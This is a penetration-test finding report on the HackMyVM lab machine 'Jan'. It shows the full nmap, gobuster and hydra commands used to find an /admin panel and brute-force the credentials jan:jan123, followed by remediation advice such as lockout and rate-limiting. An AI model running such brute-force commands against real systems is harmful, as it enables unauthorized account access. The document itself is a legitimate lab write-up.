📑 Finding Report: User Access (Jan – HackMyVM)
1. Executive Summary
Severity: Low / Informational

Brief description:
Access to the user account jan on the Jan machine from HackMyVM was achieved through brute-forcing the HTTP panel on port 8080.

2. Scope and Environment
Platform: HackMyVM

Machine: Jan (Easy – Linux)

Assigned IP: 192.168.1.130

Test Date: 26/04/2025

Tools Used:

nmap

gobuster

hydra

3. Finding Description
Clear explanation of what was achieved and its significance:

Through a brute-force attack on the login form located at http://192.168.1.130:8080/admin, valid credentials (jan:jan123) were obtained, allowing authentication as user jan.
This demonstrates that the panel does not limit or delay failed login attempts, making it vulnerable to brute-force attacks against real users.

4. Proof of Concept (PoC)
4.1. Port Scanning
nmap -sV -sC -oN jan_nmap.txt 192.168.1.130
Open ports: 22/tcp (SSH), 8080/tcp (HTTP)

4.2. Web Enumeration
gobuster dir -u http://192.168.1.130:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 45
Discovered directory: /admin

4.3. Credential Brute-Forcing

hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.168.1.130 http-post-form "/admin/index.php:username=^USER^&password=^PASS^:F=Invalid" -s 8080
Discovered credentials: jan:jan123

4.4. Account Access
Successful authentication using the retrieved credentials.

5. Impact
Low impact in a CTF or testing environment.

In a real-world scenario, an attacker could:

Enumerate valid users.

Attempt privilege escalation from that account (if vulnerable code is found).

Launch social engineering attacks against internal users.

6. Recommendations / Remediation
Implement account lockout or penalties after a limited number of failed attempts (e.g., after 5 tries).

Add delays (rate-limiting) between login attempts.

Monitor and alert for brute-force patterns.

(Optional) Implement multi-factor authentication (MFA) for administrative access.
